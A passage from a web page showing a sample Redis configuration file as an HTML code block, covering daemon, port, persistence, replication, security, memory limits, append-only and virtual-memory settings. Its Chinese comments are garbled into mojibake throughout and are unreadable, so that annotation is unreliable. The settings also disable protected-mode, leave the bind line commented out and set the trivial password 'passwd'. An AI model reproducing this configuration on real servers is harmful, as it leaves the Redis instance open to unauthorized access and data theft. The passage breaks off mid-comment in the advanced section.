class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br></pre></td><td class="code"><pre><span class="line"># Redisé…ç½®æ–‡ä»¶æ ·ä¾‹</span><br><span class="line"></span><br><span class="line"># Redisé»˜è®¤ä¸æ˜¯ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼è¿è¡Œï¼Œå¯ä»¥é€šè¿‡è¯¥é…ç½®é¡¹ä¿®æ”¹ï¼Œä½¿ç”¨yeså¯ç”¨å®ˆæŠ¤è¿›ç¨‹</span><br><span class="line"># å¯ç”¨å®ˆæŠ¤è¿›ç¨‹åï¼ŒRedisä¼šæŠŠpidå†™åˆ°ä¸€ä¸ªpidfileä¸­ï¼Œåœ¨/var/run/redis.pid</span><br><span class="line">daemonize no</span><br><span class="line"> </span><br><span class="line"># å½“Redisä»¥å®ˆæŠ¤è¿›ç¨‹æ–¹å¼è¿è¡Œæ—¶ï¼ŒRedisé»˜è®¤ä¼šæŠŠpidå†™å…¥/var/run/redis.pidæ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡pidfileæŒ‡å®š</span><br><span class="line">pidfile /var/run/redis.pid</span><br><span class="line"> </span><br><span class="line"># æŒ‡å®šRedisç›‘å¬ç«¯å£ï¼Œé»˜è®¤ç«¯å£ä¸º6379</span><br><span class="line"># å¦‚æœæŒ‡å®š0ç«¯å£ï¼Œè¡¨ç¤ºRedisä¸ç›‘å¬TCPè¿æ¥</span><br><span class="line">port 6379</span><br><span class="line"> </span><br><span class="line"># ç»‘å®šçš„ä¸»æœºåœ°å€</span><br><span class="line"># ä½ å¯ä»¥ç»‘å®šå•ä¸€æ¥å£ï¼Œå¦‚æœæ²¡æœ‰ç»‘å®šï¼Œæ‰€æœ‰æ¥å£éƒ½ä¼šç›‘å¬åˆ°æ¥çš„è¿æ¥</span><br><span class="line"># bind 0.0.0.0</span><br><span class="line"># 2ã€å…³é—­ä¿æŠ¤æœºåˆ¶</span><br><span class="line">protected-mode no</span><br><span class="line"> </span><br><span class="line"># Specify the path for the unix socket that will be used to listen for</span><br><span class="line"># incoming connections. There is no default, so Redis will not listen</span><br><span class="line"># on a unix socket when not specified.</span><br><span class="line">#</span><br><span class="line"># unixsocket /tmp/redis.sock</span><br><span class="line"># unixsocketperm 755</span><br><span class="line"></span><br><span class="line"># å½“å®¢æˆ·ç«¯é—²ç½®å¤šé•¿æ—¶é—´åå…³é—­è¿æ¥ï¼Œå¦‚æœæŒ‡å®šä¸º0ï¼Œè¡¨ç¤ºå…³é—­è¯¥åŠŸèƒ½</span><br><span class="line">timeout 0</span><br><span class="line"> </span><br><span class="line"># æŒ‡å®šæ—¥å¿—è®°å½•çº§åˆ«ï¼ŒRedisæ€»å…±æ”¯æŒå››ä¸ªçº§åˆ«ï¼šdebugã€verboseã€noticeã€warningï¼Œé»˜è®¤ä¸ºverbose</span><br><span class="line"># debug (å¾ˆå¤šä¿¡æ¯, å¯¹å¼€å‘ï¼æµ‹è¯•æ¯”è¾ƒæœ‰ç”¨)</span><br><span class="line"># verbose (many rarely useful info, but not a mess like the debug level)</span><br><span class="line"># notice (moderately verbose, what you want in production probably)</span><br><span class="line"># warning (only very important / critical messages are logged)</span><br><span class="line">loglevel verbose</span><br><span class="line"> </span><br><span class="line"># æ—¥å¿—è®°å½•æ–¹å¼ï¼Œé»˜è®¤ä¸ºæ ‡å‡†è¾“å‡ºï¼Œå¦‚æœé…ç½®ä¸ºredisä¸ºå®ˆæŠ¤è¿›ç¨‹æ–¹å¼è¿è¡Œï¼Œè€Œè¿™é‡Œåˆé…ç½®ä¸ºæ ‡å‡†è¾“å‡ºï¼Œåˆ™æ—¥å¿—å°†ä¼šå‘é€ç»™/dev/null</span><br><span class="line">logfile &quot;&quot;</span><br><span class="line"> </span><br><span class="line"># To enable logging to the system logger, just set &#x27;syslog-enabled&#x27; to yes,</span><br><span class="line"># and optionally update the other syslog parameters to suit your needs.</span><br><span class="line"># syslog-enabled no</span><br><span class="line"> </span><br><span class="line"># Specify the syslog identity.</span><br><span class="line"># syslog-ident redis</span><br><span class="line"> </span><br><span class="line"># Specify the syslog facility.  Must be USER or between LOCAL0-LOCAL7.</span><br><span class="line"># syslog-facility local0</span><br><span class="line"> </span><br><span class="line"># è®¾ç½®æ•°æ®åº“çš„æ•°é‡ï¼Œé»˜è®¤æ•°æ®åº“ä¸º0ï¼Œå¯ä»¥ä½¿ç”¨select &lt;dbid&gt;å‘½ä»¤åœ¨è¿æ¥ä¸ŠæŒ‡å®šæ•°æ®åº“id</span><br><span class="line"># dbidæ˜¯ä»0åˆ°â€˜databasesâ€™-1çš„æ•°ç›®</span><br><span class="line">databases 16</span><br><span class="line"> </span><br><span class="line">################################ SNAPSHOTTING  #################################</span><br><span class="line"># æŒ‡å®šåœ¨å¤šé•¿æ—¶é—´å†…ï¼Œæœ‰å¤šå°‘æ¬¡æ›´æ–°æ“ä½œï¼Œå°±å°†æ•°æ®åŒæ­¥åˆ°æ•°æ®æ–‡ä»¶ï¼Œå¯ä»¥å¤šä¸ªæ¡ä»¶é…åˆ</span><br><span class="line"># Save the DB on disk:</span><br><span class="line">#</span><br><span class="line">#   save &lt;seconds&gt; &lt;changes&gt;</span><br><span class="line">#</span><br><span class="line">#   Will save the DB if both the given number of seconds and the given</span><br><span class="line">#   number of write operations against the DB occurred.</span><br><span class="line">#</span><br><span class="line">#   æ»¡è¶³ä»¥ä¸‹æ¡ä»¶å°†ä¼šåŒæ­¥æ•°æ®:</span><br><span class="line">#   900ç§’ï¼ˆ15åˆ†é’Ÿï¼‰å†…æœ‰1ä¸ªæ›´æ”¹</span><br><span class="line">#   300ç§’ï¼ˆ5åˆ†é’Ÿï¼‰å†…æœ‰10ä¸ªæ›´æ”¹</span><br><span class="line">#   60ç§’å†…æœ‰10000ä¸ªæ›´æ”¹</span><br><span class="line">#   Note: å¯ä»¥æŠŠæ‰€æœ‰â€œsaveâ€è¡Œæ³¨é‡Šæ‰ï¼Œè¿™æ ·å°±å–æ¶ˆåŒæ­¥æ“ä½œäº†</span><br><span class="line"> </span><br><span class="line">save 900 1</span><br><span class="line">save 300 10</span><br><span class="line">save 60 10000</span><br><span class="line"> </span><br><span class="line"># æŒ‡å®šå­˜å‚¨è‡³æœ¬åœ°æ•°æ®åº“æ—¶æ˜¯å¦å‹ç¼©æ•°æ®ï¼Œé»˜è®¤ä¸ºyesï¼ŒRedisé‡‡ç”¨LZFå‹ç¼©ï¼Œå¦‚æœä¸ºäº†èŠ‚çœCPUæ—¶é—´ï¼Œå¯ä»¥å…³é—­è¯¥é€‰é¡¹ï¼Œä½†ä¼šå¯¼è‡´æ•°æ®åº“æ–‡ä»¶å˜çš„å·¨å¤§</span><br><span class="line">rdbcompression yes</span><br><span class="line"> </span><br><span class="line"># æŒ‡å®šæœ¬åœ°æ•°æ®åº“æ–‡ä»¶åï¼Œé»˜è®¤å€¼ä¸ºdump.rdb</span><br><span class="line">dbfilename dump.rdb</span><br><span class="line"> </span><br><span class="line"># å·¥ä½œç›®å½•.</span><br><span class="line"># æŒ‡å®šæœ¬åœ°æ•°æ®åº“å­˜æ”¾ç›®å½•ï¼Œæ–‡ä»¶åç”±ä¸Šä¸€ä¸ªdbfilenameé…ç½®é¡¹æŒ‡å®š</span><br><span class="line">#</span><br><span class="line"># Also the Append Only File will be created inside this directory.</span><br><span class="line">#</span><br><span class="line"># æ³¨æ„ï¼Œè¿™é‡Œåªèƒ½æŒ‡å®šä¸€ä¸ªç›®å½•ï¼Œä¸èƒ½æŒ‡å®šæ–‡ä»¶å</span><br><span class="line">dir ./</span><br><span class="line"> </span><br><span class="line">################################# REPLICATION #################################</span><br><span class="line"> </span><br><span class="line"># ä¸»ä»å¤åˆ¶ã€‚ä½¿ç”¨slaveofä» RedisæœåŠ¡å™¨å¤åˆ¶ä¸€ä¸ªRediså®ä¾‹ã€‚æ³¨æ„ï¼Œè¯¥é…ç½®ä»…é™äºå½“å‰slaveæœ‰æ•ˆ</span><br><span class="line"># so for example it is possible to configure the slave to save the DB with a</span><br><span class="line"># different interval, or to listen to another port, and so on.</span><br><span class="line"># è®¾ç½®å½“æœ¬æœºä¸ºslavæœåŠ¡æ—¶ï¼Œè®¾ç½®masteræœåŠ¡çš„ipåœ°å€åŠç«¯å£ï¼Œåœ¨Rediså¯åŠ¨æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨ä»masterè¿›è¡Œæ•°æ®åŒæ­¥</span><br><span class="line"># slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># å½“masteræœåŠ¡è®¾ç½®äº†å¯†ç ä¿æŠ¤æ—¶ï¼ŒslavæœåŠ¡è¿æ¥masterçš„å¯†ç </span><br><span class="line"># ä¸‹æ–‡çš„â€œrequirepassâ€é…ç½®é¡¹å¯ä»¥æŒ‡å®šå¯†ç </span><br><span class="line"># masterauth &lt;master-password&gt;</span><br><span class="line"> </span><br><span class="line"># When a slave lost the connection with the master, or when the replication</span><br><span class="line"># is still in progress, the slave can act in two different ways:</span><br><span class="line">#</span><br><span class="line"># 1) if slave-serve-stale-data is set to &#x27;yes&#x27; (the default) the slave will</span><br><span class="line">#    still reply to client requests, possibly with out of data data, or the</span><br><span class="line">#    data set may just be empty if this is the first synchronization.</span><br><span class="line">#</span><br><span class="line"># 2) if slave-serve-stale data is set to &#x27;no&#x27; the slave will reply with</span><br><span class="line">#    an error &quot;SYNC with master in progress&quot; to all the kind of commands</span><br><span class="line">#    but to INFO and SLAVEOF.</span><br><span class="line">#</span><br><span class="line">slave-serve-stale-data yes</span><br><span class="line"> </span><br><span class="line"># Slaves send PINGs to server in a predefined interval. It&#x27;s possible to change</span><br><span class="line"># this interval with the repl_ping_slave_period option. The default value is 10</span><br><span class="line"># seconds.</span><br><span class="line">#</span><br><span class="line"># repl-ping-slave-period 10</span><br><span class="line"> </span><br><span class="line"># The following option sets a timeout for both Bulk transfer I/O timeout and</span><br><span class="line"># master data or ping response timeout. The default value is 60 seconds.</span><br><span class="line">#</span><br><span class="line"># It is important to make sure that this value is greater than the value</span><br><span class="line"># specified for repl-ping-slave-period otherwise a timeout will be detected</span><br><span class="line"># every time there is low traffic between the master and the slave.</span><br><span class="line">#</span><br><span class="line"># repl-timeout 60</span><br><span class="line"> </span><br><span class="line">################################## SECURITY ###################################</span><br><span class="line"> </span><br><span class="line"># Warning: since Redis is pretty fast an outside user can try up to</span><br><span class="line"># 150k passwords per second against a good box. This means that you should</span><br><span class="line"># use a very strong password otherwise it will be very easy to break.</span><br><span class="line"># è®¾ç½®Redisè¿æ¥å¯†ç ï¼Œå¦‚æœé…ç½®äº†è¿æ¥å¯†ç ï¼Œå®¢æˆ·ç«¯åœ¨è¿æ¥Redisæ—¶éœ€è¦é€šè¿‡auth &lt;password&gt;å‘½ä»¤æä¾›å¯†ç ï¼Œé»˜è®¤å…³é—­</span><br><span class="line">requirepass passwd</span><br><span class="line"># Command renaming.</span><br><span class="line">#</span><br><span class="line"># It is possilbe to change the name of dangerous commands in a shared</span><br><span class="line"># environment. For instance the CONFIG command may be renamed into something</span><br><span class="line"># of hard to guess so that it will be still available for internal-use</span><br><span class="line"># tools but not available for general clients.</span><br><span class="line">#</span><br><span class="line"># Example:</span><br><span class="line">#</span><br><span class="line"># rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52</span><br><span class="line">#</span><br><span class="line"># It is also possilbe to completely kill a command renaming it into</span><br><span class="line"># an empty string:</span><br><span class="line">#</span><br><span class="line"># rename-command CONFIG &quot;&quot;</span><br><span class="line"> </span><br><span class="line">################################### LIMITS ####################################</span><br><span class="line"> </span><br><span class="line"># è®¾ç½®åŒä¸€æ—¶é—´æœ€å¤§å®¢æˆ·ç«¯è¿æ¥æ•°ï¼Œé»˜è®¤æ— é™åˆ¶ï¼ŒRediså¯ä»¥åŒæ—¶æ‰“å¼€çš„å®¢æˆ·ç«¯è¿æ¥æ•°ä¸ºRedisè¿›ç¨‹å¯ä»¥æ‰“å¼€çš„æœ€å¤§æ–‡ä»¶æè¿°ç¬¦æ•°ï¼Œ</span><br><span class="line"># å¦‚æœè®¾ç½®maxclients 0ï¼Œè¡¨ç¤ºä¸ä½œé™åˆ¶ã€‚å½“å®¢æˆ·ç«¯è¿æ¥æ•°åˆ°è¾¾é™åˆ¶æ—¶ï¼ŒRedisä¼šå…³é—­æ–°çš„è¿æ¥å¹¶å‘å®¢æˆ·ç«¯è¿”å›max Number of clients reachedé”™è¯¯ä¿¡æ¯</span><br><span class="line"># maxclients 128</span><br><span class="line"> </span><br><span class="line"># Don&#x27;t use more memory than the specified amount of bytes.</span><br><span class="line"># When the memory limit is reached Redis will try to remove keys with an</span><br><span class="line"># EXPIRE set. It will try to start freeing keys that are going to expire</span><br><span class="line"># in little time and preserve keys with a longer time to live.</span><br><span class="line"># Redis will also try to remove objects from free lists if possible.</span><br><span class="line">#</span><br><span class="line"># If all this fails, Redis will start to reply with errors to commands</span><br><span class="line"># that will use more memory, like SET, LPUSH, and so on, and will continue</span><br><span class="line"># to reply to most read-only commands like GET.</span><br><span class="line">#</span><br><span class="line"># WARNING: maxmemory can be a good idea mainly if you want to use Redis as a</span><br><span class="line"># &#x27;state&#x27; server or cache, not as a real DB. When Redis is used as a real</span><br><span class="line"># database the memory usage will grow over the weeks, it will be obvious if</span><br><span class="line"># it is going to use too much memory in the long run, and you&#x27;ll have the time</span><br><span class="line"># to upgrade. With maxmemory after the limit is reached you&#x27;ll start to get</span><br><span class="line"># errors for write operations, and this may even lead to DB inconsistency.</span><br><span class="line"># æŒ‡å®šRedisæœ€å¤§å†…å­˜é™åˆ¶ï¼ŒRedisåœ¨å¯åŠ¨æ—¶ä¼šæŠŠæ•°æ®åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œè¾¾åˆ°æœ€å¤§å†…å­˜åï¼ŒRedisä¼šå…ˆå°è¯•æ¸…é™¤å·²åˆ°æœŸæˆ–å³å°†åˆ°æœŸçš„Keyï¼Œ</span><br><span class="line"># å½“æ­¤æ–¹æ³•å¤„ç†åï¼Œä»ç„¶åˆ°è¾¾æœ€å¤§å†…å­˜è®¾ç½®ï¼Œå°†æ— æ³•å†è¿›è¡Œå†™å…¥æ“ä½œï¼Œä½†ä»ç„¶å¯ä»¥è¿›è¡Œè¯»å–æ“ä½œã€‚</span><br><span class="line"># Redisæ–°çš„vmæœºåˆ¶ï¼Œä¼šæŠŠKeyå­˜æ”¾å†…å­˜ï¼ŒValueä¼šå­˜æ”¾åœ¨swapåŒº</span><br><span class="line"># maxmemory &lt;bytes&gt;</span><br><span class="line"> </span><br><span class="line"># MAXMEMORY POLICY: how Redis will select what to remove when maxmemory</span><br><span class="line"># is reached? You can select among five behavior:</span><br><span class="line">#</span><br><span class="line"># volatile-lru -&gt; remove the key with an expire set using an LRU algorithm</span><br><span class="line"># allkeys-lru -&gt; remove any key accordingly to the LRU algorithm</span><br><span class="line"># volatile-random -&gt; remove a random key with an expire set</span><br><span class="line"># allkeys-&gt;random -&gt; remove a random key, any key</span><br><span class="line"># volatile-ttl -&gt; remove the key with the nearest expire time (minor TTL)</span><br><span class="line"># noeviction -&gt; don&#x27;t expire at all, just return an error on write operations</span><br><span class="line">#</span><br><span class="line"># Note: with all the kind of policies, Redis will return an error on write</span><br><span class="line">#       operations, when there are not suitable keys for eviction.</span><br><span class="line">#</span><br><span class="line">#       At the date of writing this commands are: set setnx setex append</span><br><span class="line">#       incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd</span><br><span class="line">#       sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby</span><br><span class="line">#       zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby</span><br><span class="line">#       getset mset msetnx exec sort</span><br><span class="line">#</span><br><span class="line"># The default is:</span><br><span class="line">#</span><br><span class="line"># maxmemory-policy volatile-lru</span><br><span class="line"> </span><br><span class="line"># LRU and minimal TTL algorithms are not precise algorithms but approximated</span><br><span class="line"># algorithms (in order to save memory), so you can select as well the sample</span><br><span class="line"># size to check. For instance for default Redis will check three keys and</span><br><span class="line"># pick the one that was used less recently, you can change the sample size</span><br><span class="line"># using the following configuration directive.</span><br><span class="line">#</span><br><span class="line"># maxmemory-samples 3</span><br><span class="line"> </span><br><span class="line">############################## APPEND ONLY MODE ###############################</span><br><span class="line"> </span><br><span class="line">#</span><br><span class="line"># Note that you can have both the async dumps and the append only file if you</span><br><span class="line"># like (you have to comment the &quot;save&quot; statements above to disable the dumps).</span><br><span class="line"># Still if append only mode is enabled Redis will load the data from the</span><br><span class="line"># log file at startup ignoring the dump.rdb file.</span><br><span class="line"># æŒ‡å®šæ˜¯å¦åœ¨æ¯æ¬¡æ›´æ–°æ“ä½œåè¿›è¡Œæ—¥å¿—è®°å½•ï¼ŒRedisåœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯å¼‚æ­¥çš„æŠŠæ•°æ®å†™å…¥ç£ç›˜ï¼Œå¦‚æœä¸å¼€å¯ï¼Œå¯èƒ½ä¼šåœ¨æ–­ç”µæ—¶å¯¼è‡´ä¸€æ®µæ—¶é—´å†…çš„æ•°æ®ä¸¢å¤±ã€‚</span><br><span class="line"># å› ä¸ºredisæœ¬èº«åŒæ­¥æ•°æ®æ–‡ä»¶æ˜¯æŒ‰ä¸Šé¢saveæ¡ä»¶æ¥åŒæ­¥çš„ï¼Œæ‰€ä»¥æœ‰çš„æ•°æ®ä¼šåœ¨ä¸€æ®µæ—¶é—´å†…åªå­˜åœ¨äºå†…å­˜ä¸­ã€‚é»˜è®¤ä¸ºno</span><br><span class="line"># IMPORTANT: Check the BGREWRITEAOF to check how to rewrite the append</span><br><span class="line"># log file in background when it gets too big.</span><br><span class="line"> </span><br><span class="line">appendonly no</span><br><span class="line"> </span><br><span class="line"># æŒ‡å®šæ›´æ–°æ—¥å¿—æ–‡ä»¶åï¼Œé»˜è®¤ä¸ºappendonly.aof</span><br><span class="line"># appendfilename appendonly.aof</span><br><span class="line"> </span><br><span class="line"># The fsync() call tells the Operating System to actually write data on disk</span><br><span class="line"># instead to wait for more data in the output buffer. Some OS will really flush</span><br><span class="line"># data on disk, some other OS will just try to do it ASAP.</span><br><span class="line"> </span><br><span class="line"># æŒ‡å®šæ›´æ–°æ—¥å¿—æ¡ä»¶ï¼Œå…±æœ‰3ä¸ªå¯é€‰å€¼ï¼š</span><br><span class="line"># no:è¡¨ç¤ºç­‰æ“ä½œç³»ç»Ÿè¿›è¡Œæ•°æ®ç¼“å­˜åŒæ­¥åˆ°ç£ç›˜ï¼ˆå¿«ï¼‰</span><br><span class="line"># always:è¡¨ç¤ºæ¯æ¬¡æ›´æ–°æ“ä½œåæ‰‹åŠ¨è°ƒç”¨fsync()å°†æ•°æ®å†™åˆ°ç£ç›˜ï¼ˆæ…¢ï¼Œå®‰å…¨ï¼‰</span><br><span class="line"># everysec:è¡¨ç¤ºæ¯ç§’åŒæ­¥ä¸€æ¬¡ï¼ˆæŠ˜è¡·ï¼Œé»˜è®¤å€¼ï¼‰</span><br><span class="line"> </span><br><span class="line">appendfsync everysec</span><br><span class="line"># appendfsync no</span><br><span class="line"> </span><br><span class="line"># When the AOF fsync policy is set to always or everysec, and a background</span><br><span class="line"># saving process (a background save or AOF log background rewriting) is</span><br><span class="line"># performing a lot of I/O against the disk, in some Linux configurations</span><br><span class="line"># Redis may block too long on the fsync() call. Note that there is no fix for</span><br><span class="line"># this currently, as even performing fsync in a different thread will block</span><br><span class="line"># our synchronous write(2) call.</span><br><span class="line">#</span><br><span class="line"># In order to mitigate this problem it&#x27;s possible to use the following option</span><br><span class="line"># that will prevent fsync() from being called in the main process while a</span><br><span class="line"># BGSAVE or BGREWRITEAOF is in progress.</span><br><span class="line">#</span><br><span class="line"># This means that while another child is saving the durability of Redis is</span><br><span class="line"># the same as &quot;appendfsync none&quot;, that in pratical terms means that it is</span><br><span class="line"># possible to lost up to 30 seconds of log in the worst scenario (with the</span><br><span class="line"># default Linux settings).</span><br><span class="line">#</span><br><span class="line"># If you have latency problems turn this to &quot;yes&quot;. Otherwise leave it as</span><br><span class="line"># &quot;no&quot; that is the safest pick from the point of view of durability.</span><br><span class="line">no-appendfsync-on-rewrite no</span><br><span class="line"> </span><br><span class="line"># Automatic rewrite of the append only file.</span><br><span class="line"># Redis is able to automatically rewrite the log file implicitly calling</span><br><span class="line"># BGREWRITEAOF when the AOF log size will growth by the specified percentage.</span><br><span class="line">#</span><br><span class="line"># This is how it works: Redis remembers the size of the AOF file after the</span><br><span class="line"># latest rewrite (or if no rewrite happened since the restart, the size of</span><br><span class="line"># the AOF at startup is used).</span><br><span class="line">#</span><br><span class="line"># This base size is compared to the current size. If the current size is</span><br><span class="line"># bigger than the specified percentage, the rewrite is triggered. Also</span><br><span class="line"># you need to specify a minimal size for the AOF file to be rewritten, this</span><br><span class="line"># is useful to avoid rewriting the AOF file even if the percentage increase</span><br><span class="line"># is reached but it is still pretty small.</span><br><span class="line">#</span><br><span class="line"># Specify a precentage of zero in order to disable the automatic AOF</span><br><span class="line"># rewrite feature.</span><br><span class="line"> </span><br><span class="line">auto-aof-rewrite-percentage 100</span><br><span class="line">auto-aof-rewrite-min-size 64mb</span><br><span class="line"> </span><br><span class="line">################################## SLOW LOG ###################################</span><br><span class="line"> </span><br><span class="line"># The Redis Slow Log is a system to log queries that exceeded a specified</span><br><span class="line"># execution time. The execution time does not include the I/O operations</span><br><span class="line"># like talking with the client, sending the reply and so forth,</span><br><span class="line"># but just the time needed to actually execute the command (this is the only</span><br><span class="line"># stage of command execution where the thread is blocked and can not serve</span><br><span class="line"># other requests in the meantime).</span><br><span class="line">#</span><br><span class="line"># You can configure the slow log with two parameters: one tells Redis</span><br><span class="line"># what is the execution time, in microseconds, to exceed in order for the</span><br><span class="line"># command to get logged, and the other parameter is the length of the</span><br><span class="line"># slow log. When a new command is logged the oldest one is removed from the</span><br><span class="line"># queue of logged commands.</span><br><span class="line"> </span><br><span class="line"># The following time is expressed in microseconds, so 1000000 is equivalent</span><br><span class="line"># to one second. Note that a negative number disables the slow log, while</span><br><span class="line"># a value of zero forces the logging of every command.</span><br><span class="line">slowlog-log-slower-than 10000</span><br><span class="line"> </span><br><span class="line"># There is no limit to this length. Just be aware that it will consume memory.</span><br><span class="line"># You can reclaim memory used by the slow log with SLOWLOG RESET.</span><br><span class="line">slowlog-max-len 1024</span><br><span class="line"> </span><br><span class="line">################################ VIRTUAL MEMORY ###############################</span><br><span class="line"> </span><br><span class="line">### WARNING! Virtual Memory is deprecated in Redis 2.4</span><br><span class="line">### The use of Virtual Memory is strongly discouraged.</span><br><span class="line"> </span><br><span class="line">### WARNING! Virtual Memory is deprecated in Redis 2.4</span><br><span class="line">### The use of Virtual Memory is strongly discouraged.</span><br><span class="line"> </span><br><span class="line"># Virtual Memory allows Redis to work with datasets bigger than the actual</span><br><span class="line"># amount of RAM needed to hold the whole dataset in memory.</span><br><span class="line"># In order to do so very used keys are taken in memory while the other keys</span><br><span class="line"># are swapped into a swap file, similarly to what operating systems do</span><br><span class="line"># with memory pages.</span><br><span class="line"># æŒ‡å®šæ˜¯å¦å¯ç”¨è™šæ‹Ÿå†…å­˜æœºåˆ¶ï¼Œé»˜è®¤å€¼ä¸ºnoï¼Œ</span><br><span class="line"># VMæœºåˆ¶å°†æ•°æ®åˆ†é¡µå­˜æ”¾ï¼Œç”±Rediså°†è®¿é—®é‡è¾ƒå°‘çš„é¡µå³å†·æ•°æ®swapåˆ°ç£ç›˜ä¸Šï¼Œè®¿é—®å¤šçš„é¡µé¢ç”±ç£ç›˜è‡ªåŠ¨æ¢å‡ºåˆ°å†…å­˜ä¸­</span><br><span class="line"># æŠŠvm-enabledè®¾ç½®ä¸ºyesï¼Œæ ¹æ®éœ€è¦è®¾ç½®å¥½æ¥ä¸‹æ¥çš„ä¸‰ä¸ªVMå‚æ•°ï¼Œå°±å¯ä»¥å¯åŠ¨VMäº†</span><br><span class="line"># vm-enabled no</span><br><span class="line"># vm-enabled yes</span><br><span class="line"> </span><br><span class="line"># This is the path of the Redis swap file. As you can guess, swap files</span><br><span class="line"># can&#x27;t be shared by different Redis instances, so make sure to use a swap</span><br><span class="line"># file for every redis process you are running. Redis will complain if the</span><br><span class="line"># swap file is already in use.</span><br><span class="line">#</span><br><span class="line"># Redisäº¤æ¢æ–‡ä»¶æœ€å¥½çš„å­˜å‚¨æ˜¯SSDï¼ˆå›ºæ€ç¡¬ç›˜ï¼‰</span><br><span class="line"># è™šæ‹Ÿå†…å­˜æ–‡ä»¶è·¯å¾„ï¼Œé»˜è®¤å€¼ä¸º/tmp/redis.swapï¼Œä¸å¯å¤šä¸ªRediså®ä¾‹å…±äº«</span><br><span class="line"># *** WARNING *** if you are using a shared hosting the default of putting</span><br><span class="line"># the swap file under /tmp is not secure. Create a dir with access granted</span><br><span class="line"># only to Redis user and configure Redis to create the swap file there.</span><br><span class="line"># vm-swap-file /tmp/redis.swap</span><br><span class="line"> </span><br><span class="line"># With vm-max-memory 0 the system will swap everything it can. Not a good</span><br><span class="line"># default, just specify the max amount of RAM you can in bytes, but it&#x27;s</span><br><span class="line"># better to leave some margin. For instance specify an amount of RAM</span><br><span class="line"># that&#x27;s more or less between 60 and 80% of your free RAM.</span><br><span class="line"># å°†æ‰€æœ‰å¤§äºvm-max-memoryçš„æ•°æ®å­˜å…¥è™šæ‹Ÿå†…å­˜ï¼Œæ— è®ºvm-max-memoryè®¾ç½®å¤šå°‘ï¼Œæ‰€æœ‰ç´¢å¼•æ•°æ®éƒ½æ˜¯å†…å­˜å­˜å‚¨çš„ï¼ˆRedisçš„ç´¢å¼•æ•°æ®å°±æ˜¯keysï¼‰</span><br><span class="line"># ä¹Ÿå°±æ˜¯è¯´å½“vm-max-memoryè®¾ç½®ä¸º0çš„æ—¶å€™ï¼Œå…¶å®æ˜¯æ‰€æœ‰valueéƒ½å­˜åœ¨äºç£ç›˜ã€‚é»˜è®¤å€¼ä¸º0</span><br><span class="line"># vm-max-memory 0</span><br><span class="line"> </span><br><span class="line"># Redis swapæ–‡ä»¶åˆ†æˆäº†å¾ˆå¤šçš„pageï¼Œä¸€ä¸ªå¯¹è±¡å¯ä»¥ä¿å­˜åœ¨å¤šä¸ªpageä¸Šé¢ï¼Œä½†ä¸€ä¸ªpageä¸Šä¸èƒ½è¢«å¤šä¸ªå¯¹è±¡å…±äº«ï¼Œvm-page-sizeæ˜¯è¦æ ¹æ®å­˜å‚¨çš„æ•°æ®å¤§å°æ¥è®¾å®šçš„ã€‚</span><br><span class="line"># å»ºè®®å¦‚æœå­˜å‚¨å¾ˆå¤šå°å¯¹è±¡ï¼Œpageå¤§å°æœ€åè®¾ç½®ä¸º32æˆ–64bytesï¼›å¦‚æœå­˜å‚¨å¾ˆå¤§çš„å¯¹è±¡ï¼Œåˆ™å¯ä»¥ä½¿ç”¨æ›´å¤§çš„pageï¼Œå¦‚æœä¸ç¡®å®šï¼Œå°±ä½¿ç”¨é»˜è®¤å€¼</span><br><span class="line"># vm-page-size 32</span><br><span class="line"> </span><br><span class="line"># è®¾ç½®swapæ–‡ä»¶ä¸­çš„pageæ•°é‡ç”±äºé¡µè¡¨ï¼ˆä¸€ç§è¡¨ç¤ºé¡µé¢ç©ºé—²æˆ–ä½¿ç”¨çš„bitmapï¼‰æ˜¯å­˜æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œåœ¨ç£ç›˜ä¸Šæ¯8ä¸ªpageså°†æ¶ˆè€—1byteçš„å†…å­˜</span><br><span class="line"># swapç©ºé—´æ€»å®¹é‡ä¸º vm-page-size * vm-pages</span><br><span class="line">#</span><br><span class="line"># With the default of 32-bytes memory pages and 134217728 pages Redis will</span><br><span class="line"># use a 4 GB swap file, that will use 16 MB of RAM for the page table.</span><br><span class="line">#</span><br><span class="line"># It&#x27;s better to use the smallest acceptable value for your application,</span><br><span class="line"># but the default is large in order to work in most conditions.</span><br><span class="line"># vm-pages 134217728</span><br><span class="line"> </span><br><span class="line"># Max number of VM I/O threads running at the same time.</span><br><span class="line"># This threads are used to read/write data from/to swap file, since they</span><br><span class="line"># also encode and decode objects from disk to memory or the reverse, a bigger</span><br><span class="line"># number of threads can help with big objects even if they can&#x27;t help with</span><br><span class="line"># I/O itself as the physical device may not be able to couple with many</span><br><span class="line"># reads/writes operations at the same time.</span><br><span class="line"># è®¾ç½®è®¿é—®swapæ–‡ä»¶çš„I/Oçº¿ç¨‹æ•°ï¼Œæœ€åä¸è¦è¶…è¿‡æœºå™¨çš„æ ¸æ•°ï¼Œå¦‚æœè®¾ç½®ä¸º0ï¼Œé‚£ä¹ˆæ‰€æœ‰å¯¹swapæ–‡ä»¶çš„æ“ä½œéƒ½æ˜¯ä¸²è¡Œçš„ï¼Œå¯èƒ½ä¼šé€ æˆæ¯”è¾ƒé•¿æ—¶é—´çš„å»¶è¿Ÿï¼Œé»˜è®¤å€¼ä¸º4</span><br><span class="line"># vm-max-threads 4</span><br><span class="line"> </span><br><span class="line">############################### ADVANCED CONFIG ###############################</span><br><span class="line"> </span><br><span class="line"># Hashes are 